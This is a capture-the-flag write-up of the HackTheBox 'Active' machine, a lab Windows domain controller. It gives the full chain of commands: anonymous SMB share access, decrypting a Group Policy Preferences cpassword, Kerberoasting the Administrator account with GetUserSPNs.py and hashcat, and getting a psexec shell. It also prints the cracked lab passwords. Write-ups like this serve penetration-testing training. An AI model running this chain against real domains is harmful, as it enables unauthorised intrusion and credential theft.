**PLATFORM**    | HackTheBox
**MACHINE**     | active
**OS**          | Windows
**IP**          | 10.10.10.100
**FQDN**        | active.htb

## Summary

We Accessed `Replication` share without credentials, this share was a copy of `SYSVOL`, it contained a file `Groups.xml` which is used to store `Group Policy Preferences` informations including credentials. The password was encrypted using `AES-256` but were able to decrypt it because the decryption key has been disclosed by Microsoft.

We were able to obtain the password hash of `Administrator` because it has a `SPN`, then crack it to get the password, this was easily done due to a weak password policy.

## Vulns

* Information Disclosure - Groups.xml in Replication share
* Kerberoasting - CIFS spn affiliated with administrator

## Enum

### nmap

Initial nmap scan reveals multiple open ports including 88 (kerberos), 445 (smb), ldap (389) and rpc (135). The presense of these ports incdicate that this is a domain controller in the domain `ACTIVE.HTB`

### port 445

Enumerating SMB shares shows that we have anonymous Read access over `Replication` share

```sh
crackmapexec smb 10.10.10.100 -u '' -p '' --shares
```

This share seems to be a copy of `SYSVOL` share which is used to store group policy templates, log on, logoff, startup and shutdown scripts.

```sh
smbclient -N //10.10.10.100/Replication
```

In `\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\` there is a file `Groups.xml` containing `SVC_TGS` user's credentials.

```
cpassword="edBSHOwhZLTjtQS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYwNglVmQ"
userName="active.htb\SVC_TGS"
```

The password is encrypted using AES-256 but the decryption key has been disclosed by [Microsoft](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN)

## Foothold

After obtaining the encrypted GPP password, we used `gpp-decrypt` tool to decrypt it. You can download the tool with the following command `sudo apt install gpp-decrypt`

```sh
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

The password of `SVC_TGS` is `GPPstillStandingStrong2k18`

This user have read access over multiple shares

```sh
crackmapexec smb 10.10.10.100 -d active.htb -u svc_tgs -p GPPstillStandingStrong2k18 --shares
```

![](/assets/active/006.png)

We could access `SVC_TGS` home directory from `Users` share and get the first flag.

```sh
smbclient -U active.htb/svc_tgs%GPPstillStandingStrong2k18 //10.10.10.100/Users
```

## PrivEsc

**What is a SPN?**

> SPN stands for Service Principal Name, it is an attribute that ties a service to a user account within the AD.

SPNs could be leveraged by an attacker to get a hash that can be cracked using a tool such as hashcat and obtain the password of the user associated with it. This type of attack is called [Kerberoasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast#kerberoast)

We found a `SPN` affiliated with the user `Administrator`.

```sh
GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/svc_tgs:GPPstillStandingStrong2k18
```

![](/assets/active/008.png)

We requested a Kerberos ticket for the spn `CIFS`, this ticket was encrypted using the password hash of the user affiliated with this SPN, in this case the user was `Administrator`

```sh
GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/svc_tgs:GPPstillStandingStrong2k18 -request | tee tgs.hash
```

![](/assets/active/009.png)

We were able to crack this hash offline using `hashcat`.

```sh
hashcat -a 0 -m 13100 tgs.hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```

The `Administrator`'s password is `Ticketmaster1968`.

As Administrator, we have full access over all the shares.

Here we accessed the `C$` share which is the root of the file system.

```sh
smbclient -U active.htb/administrator%Ticketmaster1968 //10.10.10.100/C\$
```

![](/assets/active/011.png)

We can also leverage the write access over all the share to get a reverse shell using a tool such as `psexec`.

```sh
psexec.py -dc-ip 10.10.10.100 active.htb/Administrator:Ticketmaster1968@10.10.10.100
```

![](/assets/active/012.png)

This way, we accessed the DC as `Administrator` and we got the root flag.
